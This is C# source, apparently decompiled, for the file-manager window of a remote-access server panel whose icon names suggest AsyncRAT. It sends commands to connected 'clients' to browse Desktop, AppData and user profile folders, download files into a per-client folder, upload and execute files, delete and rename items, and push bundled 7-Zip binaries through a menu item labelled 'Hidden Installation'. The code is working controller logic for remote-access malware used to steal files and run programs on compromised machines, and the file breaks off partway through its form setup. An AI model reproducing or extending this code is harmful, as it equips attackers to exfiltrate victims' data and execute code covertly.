using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Server.Connection;
using Server.MessagePack;
using Server.Properties;

namespace Server.Forms;

public class FormFileManager : Form
{
	private IContainer components;

	public ListView listView1;

	public ImageList imageList1;

	private ContextMenuStrip contextMenuStrip1;

	private ToolStripMenuItem backToolStripMenuItem;

	public StatusStrip statusStrip1;

	public ToolStripStatusLabel toolStripStatusLabel1;

	public ToolStripStatusLabel toolStripStatusLabel2;

	private ToolStripMenuItem downloadToolStripMenuItem;

	private ToolStripSeparator toolStripSeparator1;

	private ToolStripMenuItem uPLOADToolStripMenuItem;

	private ToolStripMenuItem dELETEToolStripMenuItem;

	private ToolStripMenuItem rEFRESHToolStripMenuItem;

	private ToolStripMenuItem eXECUTEToolStripMenuItem;

	private ToolStripMenuItem gOTOToolStripMenuItem;

	private ToolStripMenuItem dESKTOPToolStripMenuItem;

	private ToolStripMenuItem aPPDATAToolStripMenuItem;

	private ToolStripSeparator toolStripSeparator4;

	private ToolStripMenuItem createFolderToolStripMenuItem;

	private ToolStripMenuItem copyToolStripMenuItem;

	private ToolStripMenuItem pasteToolStripMenuItem;

	private ToolStripMenuItem renameToolStripMenuItem;

	public ToolStripStatusLabel toolStripStatusLabel3;

	private ToolStripMenuItem userProfileToolStripMenuItem;

	private ToolStripSeparator toolStripSeparator2;

	private ToolStripMenuItem driversListsToolStripMenuItem;

	private ToolStripSeparator toolStripSeparator3;

	private ToolStripMenuItem openClientFolderToolStripMenuItem;

	public System.Windows.Forms.Timer timer1;

	private ToolStripSeparator toolStripSeparator5;

	private ToolStripMenuItem cutToolStripMenuItem1;

	private ToolStripMenuItem sevenZiplStripMenuItem1;

	private ToolStripMenuItem installToolStripMenuItem;

	private ToolStripSeparator toolStripSeparator6;

	private ToolStripMenuItem zipToolStripMenuItem;

	private ToolStripMenuItem unzipToolStripMenuItem;

	private ColumnHeader columnHeader1;

	private ColumnHeader columnHeader2;

	public Form1 F { get; set; }

	internal Clients Client { get; set; }

	public string FullPath { get; set; }

	public FormFileManager()
	{
		InitializeComponent();
	}

	private void listView1_DoubleClick(object sender, EventArgs e)
	{
		try
		{
			if (listView1.SelectedItems.Count == 1)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = listView1.SelectedItems[0].ToolTipText;
				listView1.Enabled = false;
				toolStripStatusLabel3.ForeColor = Color.Green;
				toolStripStatusLabel3.Text = "Please Wait";
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			}
		}
		catch
		{
		}
	}

	private void backToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			string text = toolStripStatusLabel1.Text;
			if (text.Length <= 3)
			{
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getDrivers";
				toolStripStatusLabel1.Text = "";
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			}
			else
			{
				text = text.Remove(text.LastIndexOfAny(new char[1] { '\\' }, text.LastIndexOf('\\')));
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = text + "\\";
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			}
		}
		catch
		{
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Packet").AsString = "fileManager";
			msgPack2.ForcePathObject("Command").AsString = "getDrivers";
			toolStripStatusLabel1.Text = "";
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
		}
	}

	private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			if (!Directory.Exists(Path.Combine(Application.StartupPath, "ClientsFolder\\" + Client.ID)))
			{
				Directory.CreateDirectory(Path.Combine(Application.StartupPath, "ClientsFolder\\" + Client.ID));
			}
			foreach (ListViewItem selectedItem in listView1.SelectedItems)
			{
				if (selectedItem.ImageIndex == 0 && selectedItem.ImageIndex == 1 && selectedItem.ImageIndex == 2)
				{
					break;
				}
				MsgPack msgPack = new MsgPack();
				string dwid = Guid.NewGuid().ToString();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "socketDownload";
				msgPack.ForcePathObject("File").AsString = selectedItem.ToolTipText;
				msgPack.ForcePathObject("DWID").AsString = dwid;
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
				BeginInvoke((MethodInvoker)delegate
				{
					if ((FormDownloadFile)Application.OpenForms["socketDownload:" + dwid] == null)
					{
						FormDownloadFile formDownloadFile = new FormDownloadFile();
						formDownloadFile.Name = "socketDownload:" + dwid;
						formDownloadFile.Text = "socketDownload:" + Client.ID;
						formDownloadFile.F = F;
						formDownloadFile.DirPath = FullPath;
						formDownloadFile.Show();
					}
				});
			}
		}
		catch
		{
		}
	}

	private void uPLOADToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (toolStripStatusLabel1.Text.Length < 3)
		{
			return;
		}
		try
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Multiselect = true;
			if (openFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			string[] fileNames = openFileDialog.FileNames;
			foreach (string text in fileNames)
			{
				FormDownloadFile formDownloadFile = (FormDownloadFile)Application.OpenForms["socketDownload:"];
				if (formDownloadFile == null)
				{
					formDownloadFile = new FormDownloadFile
					{
						Name = "socketUpload:" + Guid.NewGuid().ToString(),
						Text = "socketUpload:" + Client.ID,
						F = Program.form1,
						Client = Client
					};
					formDownloadFile.FileSize = new FileInfo(text).Length;
					formDownloadFile.labelfile.Text = Path.GetFileName(text);
					formDownloadFile.FullFileName = text;
					formDownloadFile.label1.Text = "Upload:";
					formDownloadFile.ClientFullFileName = toolStripStatusLabel1.Text + "\\" + Path.GetFileName(text);
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "reqUploadFile";
					msgPack.ForcePathObject("ID").AsString = formDownloadFile.Name;
					formDownloadFile.Show();
					ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch
		{
		}
	}

	private void dELETEToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			foreach (ListViewItem selectedItem in listView1.SelectedItems)
			{
				if (selectedItem.ImageIndex != 0 && selectedItem.ImageIndex != 1 && selectedItem.ImageIndex != 2)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "deleteFile";
					msgPack.ForcePathObject("File").AsString = selectedItem.ToolTipText;
					ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
				}
				else if (selectedItem.ImageIndex == 0)
				{
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "fileManager";
					msgPack2.ForcePathObject("Command").AsString = "deleteFolder";
					msgPack2.ForcePathObject("Folder").AsString = selectedItem.ToolTipText;
					ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch
		{
		}
	}

	private void rEFRESHToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			if (toolStripStatusLabel1.Text != "")
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = toolStripStatusLabel1.Text;
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			}
			else
			{
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "fileManager";
				msgPack2.ForcePathObject("Command").AsString = "getDrivers";
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
			}
		}
		catch
		{
		}
	}

	private void eXECUTEToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			foreach (ListViewItem selectedItem in listView1.SelectedItems)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "execute";
				msgPack.ForcePathObject("File").AsString = selectedItem.ToolTipText;
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			}
		}
		catch
		{
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!Client.TcpClient.Connected)
			{
				Close();
			}
		}
		catch
		{
			Close();
		}
	}

	private void DESKTOPToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "fileManager";
			msgPack.ForcePathObject("Command").AsString = "getPath";
			msgPack.ForcePathObject("Path").AsString = "DESKTOP";
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}
		catch
		{
		}
	}

	private void APPDATAToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "fileManager";
			msgPack.ForcePathObject("Command").AsString = "getPath";
			msgPack.ForcePathObject("Path").AsString = "APPDATA";
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}
		catch
		{
		}
	}

	private void CreateFolderToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			string text = Interaction.InputBox("Create Folder", "Name", Path.GetRandomFileName().Replace(".", ""));
			if (!string.IsNullOrEmpty(text))
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "createFolder";
				msgPack.ForcePathObject("Folder").AsString = Path.Combine(toolStripStatusLabel1.Text, text);
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			}
		}
		catch
		{
		}
	}

	private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			StringBuilder stringBuilder = new StringBuilder();
			foreach (ListViewItem selectedItem in listView1.SelectedItems)
			{
				stringBuilder.Append(selectedItem.ToolTipText + "-=>");
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "fileManager";
			msgPack.ForcePathObject("Command").AsString = "copyFile";
			msgPack.ForcePathObject("File").AsString = stringBuilder.ToString();
			msgPack.ForcePathObject("IO").AsString = "copy";
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}
		catch
		{
		}
	}

	private void PasteToolStripMenuItem_Click_1(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "fileManager";
			msgPack.ForcePathObject("Command").AsString = "pasteFile";
			msgPack.ForcePathObject("File").AsString = toolStripStatusLabel1.Text;
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}
		catch
		{
		}
	}

	private void RenameToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (listView1.SelectedItems.Count != 1)
		{
			return;
		}
		try
		{
			string text = Interaction.InputBox("Rename File or Folder", "Name", listView1.SelectedItems[0].Text);
			if (!string.IsNullOrEmpty(text))
			{
				if (listView1.SelectedItems[0].ImageIndex != 0 && listView1.SelectedItems[0].ImageIndex != 1 && listView1.SelectedItems[0].ImageIndex != 2)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "renameFile";
					msgPack.ForcePathObject("File").AsString = listView1.SelectedItems[0].ToolTipText;
					msgPack.ForcePathObject("NewName").AsString = Path.Combine(toolStripStatusLabel1.Text, text);
					ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
				}
				else if (listView1.SelectedItems[0].ImageIndex == 0)
				{
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "fileManager";
					msgPack2.ForcePathObject("Command").AsString = "renameFolder";
					msgPack2.ForcePathObject("Folder").AsString = listView1.SelectedItems[0].ToolTipText + "\\";
					msgPack2.ForcePathObject("NewName").AsString = Path.Combine(toolStripStatusLabel1.Text, text);
					ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch
		{
		}
	}

	private void UserProfileToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "fileManager";
			msgPack.ForcePathObject("Command").AsString = "getPath";
			msgPack.ForcePathObject("Path").AsString = "USER";
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}
		catch
		{
		}
	}

	private void DriversListsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		MsgPack msgPack = new MsgPack();
		msgPack.ForcePathObject("Packet").AsString = "fileManager";
		msgPack.ForcePathObject("Command").AsString = "getDrivers";
		toolStripStatusLabel1.Text = "";
		ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
	}

	private void OpenClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			if (!Directory.Exists(FullPath))
			{
				Directory.CreateDirectory(FullPath);
			}
			Process.Start(FullPath);
		}
		catch
		{
		}
	}

	private void FormFileManager_FormClosed(object sender, FormClosedEventArgs e)
	{
		ThreadPool.QueueUserWorkItem(delegate
		{
			Client?.Disconnected();
		});
	}

	private void CutToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			StringBuilder stringBuilder = new StringBuilder();
			foreach (ListViewItem selectedItem in listView1.SelectedItems)
			{
				stringBuilder.Append(selectedItem.ToolTipText + "-=>");
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "fileManager";
			msgPack.ForcePathObject("Command").AsString = "copyFile";
			msgPack.ForcePathObject("File").AsString = stringBuilder.ToString();
			msgPack.ForcePathObject("IO").AsString = "cut";
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}
		catch
		{
		}
	}

	private void ZipToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			StringBuilder stringBuilder = new StringBuilder();
			foreach (ListViewItem selectedItem in listView1.SelectedItems)
			{
				stringBuilder.Append(selectedItem.ToolTipText + "-=>");
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "fileManager";
			msgPack.ForcePathObject("Command").AsString = "zip";
			msgPack.ForcePathObject("Path").AsString = stringBuilder.ToString();
			msgPack.ForcePathObject("Zip").AsString = "true";
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}
		catch
		{
		}
	}

	private void UnzipToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			foreach (ListViewItem selectedItem in listView1.SelectedItems)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "zip";
				msgPack.ForcePathObject("Path").AsString = selectedItem.ToolTipText;
				msgPack.ForcePathObject("Zip").AsString = "false";
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			}
		}
		catch
		{
		}
	}

	private void InstallToolStripMenuItem_Click(object sender, EventArgs e)
	{
		MsgPack msgPack = new MsgPack();
		msgPack.ForcePathObject("Packet").AsString = "fileManager";
		msgPack.ForcePathObject("Command").AsString = "installZip";
		msgPack.ForcePathObject("exe").SetAsBytes(Resources._7z);
		msgPack.ForcePathObject("dll").SetAsBytes(Resources._7z1);
		ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.Windows.Forms.ListViewGroup listViewGroup = new System.Windows.Forms.ListViewGroup("Folders", System.Windows.Forms.HorizontalAlignment.Left);
		System.Windows.Forms.ListViewGroup listViewGroup2 = new System.Windows.Forms.ListViewGroup("File", System.Windows.Forms.HorizontalAlignment.Left);
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormFileManager));
		this.listView1 = new System.Windows.Forms.ListView();
		this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.backToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.rEFRESHToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.gOTOToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.dESKTOPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.aPPDATAToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.userProfileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripSeparator2 = new System.Windows.Forms.ToolStripSeparator();
		this.driversListsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
		this.downloadToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.uPLOADToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.eXECUTEToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.renameToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.copyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.cutToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.pasteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.dELETEToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripSeparator4 = new System.Windows.Forms.ToolStripSeparator();
		this.sevenZiplStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.installToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripSeparator6 = new System.Windows.Forms.ToolStripSeparator();
		this.zipToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.unzipToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripSeparator5 = new System.Windows.Forms.ToolStripSeparator();
		this.createFolderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripSeparator3 = new System.Windows.Forms.ToolStripSeparator();
		this.openClientFolderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.imageList1 = new System.Windows.Forms.ImageList(this.components);
		this.statusStrip1 = new System.Windows.Forms.StatusStrip();
		this.toolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
		this.toolStripStatusLabel2 = new System.Windows.Forms.ToolStripStatusLabel();
		this.toolStripStatusLabel3 = new System.Windows.Forms.ToolStripStatusLabel();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.columnHeader1 = new System.Windows.Forms.ColumnHeader();
		this.columnHeader2 = new System.Windows.Forms.ColumnHeader();
		this.contextMenuStrip1.SuspendLayout();
		this.statusStrip1.SuspendLayout();
		base.SuspendLayout();
		this.listView1.AllowColumnReorder = true;
		this.listView1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.listView1.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.listView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[2] { this.columnHeader1, this.columnHeader2 });
		this.listView1.ContextMenuStrip = this.contextMenuStrip1;
		listViewGroup.Header = "Folders";
		listViewGroup.Name = "Folders";
		listViewGroup2.Header = "File";
		listViewGroup2.Name = "File";
		this.listView1.Groups.AddRange(new System.Windows.Forms.ListViewGroup[2] { listViewGroup, listViewGroup2 });
		this.listView1.HideSelection = false;
		this.listView1.LargeImageList = this.imageList1;
		this.listView1.Location = new System.Drawing.Point(0, 1);
		this.listView1.Name = "listView1";
		this.listView1.ShowItemToolTips = true;
		this.listView1.Size = new System.Drawing.Size(1058, 511);
		this.listView1.SmallImageList = this.imageList1;
		this.listView1.TabIndex = 0;
		this.listView1.UseCompatibleStateImageBehavior = false;
		this.listView1.View = System.Windows.Forms.View.Tile;
		this.listView1.DoubleClick += new System.EventHandler(listView1_DoubleClick);
		this.contextMenuStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[18]
		{
			this.backToolStripMenuItem, this.rEFRESHToolStripMenuItem, this.gOTOToolStripMenuItem, this.toolStripSeparator1, this.downloadToolStripMenuItem, this.uPLOADToolStripMenuItem, this.eXECUTEToolStripMenuItem, this.renameToolStripMenuItem, this.copyToolStripMenuItem, this.cutToolStripMenuItem1,
			this.pasteToolStripMenuItem, this.dELETEToolStripMenuItem, this.toolStripSeparator4, this.sevenZiplStripMenuItem1, this.toolStripSeparator5, this.createFolderToolStripMenuItem, this.toolStripSeparator3, this.openClientFolderToolStripMenuItem
		});
		this.contextMenuStrip1.Name = "contextMenuStrip1";
		this.contextMenuStrip1.Size = new System.Drawing.Size(233, 476);
		this.backToolStripMenuItem.Name = "backToolStripMenuItem";
		this.backToolStripMenuItem.Size = new System.Drawing.Size(232, 32);
		this.backToolStripMenuItem.Text = "Back";
		this.backToolStripMenuItem.Click += new System.EventHandler(backToolStripMenuItem_Click);
		this.rEFRESHToolStripMenuItem.Name = "rEFRESHToolStripMenuItem";
		this.rEFRESHToolStripMenuItem.Size = new System.Drawing.Size(232, 32);
		this.rEFRESHToolStripMenuItem.Text = "Refresh";
		this.rEFRESHToolStripMenuItem.Click += new System.EventHandler(rEFRESHToolStripMenuItem_Click);
		this.gOTOToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[5] { this.dESKTOPToolStripMenuItem, this.aPPDATAToolStripMenuItem, this.userProfileToolStripMenuItem, this.toolStripSeparator2, this.driversListsToolStripMenuItem });
		this.gOTOToolStripMenuItem.Name = "gOTOToolStripMenuItem";
		this.gOTOToolStripMenuItem.Size = new System.Drawing.Size(232, 32);
		this.gOTOToolStripMenuItem.Text = "Go To";
		this.dESKTOPToolStripMenuItem.Name = "dESKTOPToolStripMenuItem";
		this.dESKTOPToolStripMenuItem.Size = new System.Drawing.Size(204, 34);
		this.dESKTOPToolStripMenuItem.Text = "Desktop";
		this.dESKTOPToolStripMenuItem.Click += new System.EventHandler(DESKTOPToolStripMenuItem_Click);
		this.aPPDATAToolStripMenuItem.Name = "aPPDATAToolStripMenuItem";
		this.aPPDATAToolStripMenuItem.Size = new System.Drawing.Size(204, 34);
		this.aPPDATAToolStripMenuItem.Text = "AppData";
		this.aPPDATAToolStripMenuItem.Click += new System.EventHandler(APPDATAToolStripMenuItem_Click);
		this.userProfileToolStripMenuItem.Name = "userProfileToolStripMenuItem";
		this.userProfileToolStripMenuItem.Size = new System.Drawing.Size(204, 34);
		this.userProfileToolStripMenuItem.Text = "User Profile";
		this.userProfileToolStripMenuItem.Click += new System.EventHandler(UserProfileToolStripMenuItem_Click);
		this.toolStripSeparator2.Name = "toolStripSeparator2";
		this.toolStripSeparator2.Size = new System.Drawing.Size(201, 6);
		this.driversListsToolStripMenuItem.Name = "driversListsToolStripMenuItem";
		this.driversListsToolStripMenuItem.Size = new System.Drawing.Size(204, 34);
		this.driversListsToolStripMenuItem.Text = "Drivers";
		this.driversListsToolStripMenuItem.Click += new System.EventHandler(DriversListsToolStripMenuItem_Click);
		this.toolStripSeparator1.Name = "toolStripSeparator1";
		this.toolStripSeparator1.Size = new System.Drawing.Size(229, 6);
		this.downloadToolStripMenuItem.Name = "downloadToolStripMenuItem";
		this.downloadToolStripMenuItem.Size = new System.Drawing.Size(232, 32);
		this.downloadToolStripMenuItem.Text = "Download";
		this.downloadToolStripMenuItem.Click += new System.EventHandler(downloadToolStripMenuItem_Click);
		this.uPLOADToolStripMenuItem.Name = "uPLOADToolStripMenuItem";
		this.uPLOADToolStripMenuItem.Size = new System.Drawing.Size(232, 32);
		this.uPLOADToolStripMenuItem.Text = "Upload";
		this.uPLOADToolStripMenuItem.Click += new System.EventHandler(uPLOADToolStripMenuItem_Click);
		this.eXECUTEToolStripMenuItem.Name = "eXECUTEToolStripMenuItem";
		this.eXECUTEToolStripMenuItem.Size = new System.Drawing.Size(232, 32);
		this.eXECUTEToolStripMenuItem.Text = "Execute";
		this.eXECUTEToolStripMenuItem.Click += new System.EventHandler(eXECUTEToolStripMenuItem_Click);
		this.renameToolStripMenuItem.Name = "renameToolStripMenuItem";
		this.renameToolStripMenuItem.Size = new System.Drawing.Size(232, 32);
		this.renameToolStripMenuItem.Text = "Rename";
		this.renameToolStripMenuItem.Click += new System.EventHandler(RenameToolStripMenuItem_Click);
		this.copyToolStripMenuItem.Name = "copyToolStripMenuItem";
		this.copyToolStripMenuItem.Size = new System.Drawing.Size(232, 32);
		this.copyToolStripMenuItem.Text = "Copy";
		this.copyToolStripMenuItem.Click += new System.EventHandler(CopyToolStripMenuItem_Click);
		this.cutToolStripMenuItem1.Name = "cutToolStripMenuItem1";
		this.cutToolStripMenuItem1.Size = new System.Drawing.Size(232, 32);
		this.cutToolStripMenuItem1.Text = "Cut";
		this.cutToolStripMenuItem1.Click += new System.EventHandler(CutToolStripMenuItem1_Click);
		this.pasteToolStripMenuItem.Name = "pasteToolStripMenuItem";
		this.pasteToolStripMenuItem.Size = new System.Drawing.Size(232, 32);
		this.pasteToolStripMenuItem.Text = "Paste";
		this.pasteToolStripMenuItem.Click += new System.EventHandler(PasteToolStripMenuItem_Click_1);
		this.dELETEToolStripMenuItem.Name = "dELETEToolStripMenuItem";
		this.dELETEToolStripMenuItem.Size = new System.Drawing.Size(232, 32);
		this.dELETEToolStripMenuItem.Text = "Delete";
		this.dELETEToolStripMenuItem.Click += new System.EventHandler(dELETEToolStripMenuItem_Click);
		this.toolStripSeparator4.Name = "toolStripSeparator4";
		this.toolStripSeparator4.Size = new System.Drawing.Size(229, 6);
		this.sevenZiplStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[4] { this.installToolStripMenuItem, this.toolStripSeparator6, this.zipToolStripMenuItem, this.unzipToolStripMenuItem });
		this.sevenZiplStripMenuItem1.Name = "sevenZiplStripMenuItem1";
		this.sevenZiplStripMenuItem1.Size = new System.Drawing.Size(232, 32);
		this.sevenZiplStripMenuItem1.Text = "7-Zip";
		this.installToolStripMenuItem.Name = "installToolStripMenuItem";
		this.installToolStripMenuItem.Size = new System.Drawing.Size(263, 34);
		this.installToolStripMenuItem.Text = "Hidden Installation";
		this.installToolStripMenuItem.Click += new System.EventHandler(InstallToolStripMenuItem_Click);
		this.toolStripSeparator6.Name = "toolStripSeparator6";
		this.toolStripSeparator6.Size = new System.Drawing.Size(260, 6);
		this.zipToolStripMenuItem.Name = "zipToolStripMenuItem";
		this.zipToolStripMenuItem.Size = new System.Drawing.Size(263, 34);
		this.zipToolStripMenuItem.Text = "Zip";
		this.zipToolStripMenuItem.Click += new System.EventHandler(ZipToolStripMenuItem_Click);
		this.unzipToolStripMenuItem.Name = "unzipToolStripMenuItem";
		this.unzipToolStripMenuItem.Size = new System.Drawing.Size(263, 34);
		this.unzipToolStripMenuItem.Text = "Unzip";
		this.unzipToolStripMenuItem.Click += new System.EventHandler(UnzipToolStripMenuItem_Click);
		this.toolStripSeparator5.Name = "toolStripSeparator5";
		this.toolStripSeparator5.Size = new System.Drawing.Size(229, 6);
		this.createFolderToolStripMenuItem.Name = "createFolderToolStripMenuItem";
		this.createFolderToolStripMenuItem.Size = new System.Drawing.Size(232, 32);
		this.createFolderToolStripMenuItem.Text = "Create Folder";
		this.createFolderToolStripMenuItem.Click += new System.EventHandler(CreateFolderToolStripMenuItem_Click);
		this.toolStripSeparator3.Name = "toolStripSeparator3";
		this.toolStripSeparator3.Size = new System.Drawing.Size(229, 6);
		this.openClientFolderToolStripMenuItem.Name = "openClientFolderToolStripMenuItem";
		this.openClientFolderToolStripMenuItem.Size = new System.Drawing.Size(232, 32);
		this.openClientFolderToolStripMenuItem.Text = "Open Client Folder";
		this.openClientFolderToolStripMenuItem.Click += new System.EventHandler(OpenClientFolderToolStripMenuItem_Click);
		this.imageList1.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imageList1.ImageStream");
		this.imageList1.TransparentColor = System.Drawing.Color.Transparent;
		this.imageList1.Images.SetKeyName(0, "AsyncFolder.ico");
		this.imageList1.Images.SetKeyName(1, "AsyncHDDFixed.png");
		this.imageList1.Images.SetKeyName(2, "AsyncUSB.png");
		this.statusStrip1.AutoSize = false;
		this.statusStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.toolStripStatusLabel1, this.toolStripStatusLabel2, this.toolStripStatusLabel3 });
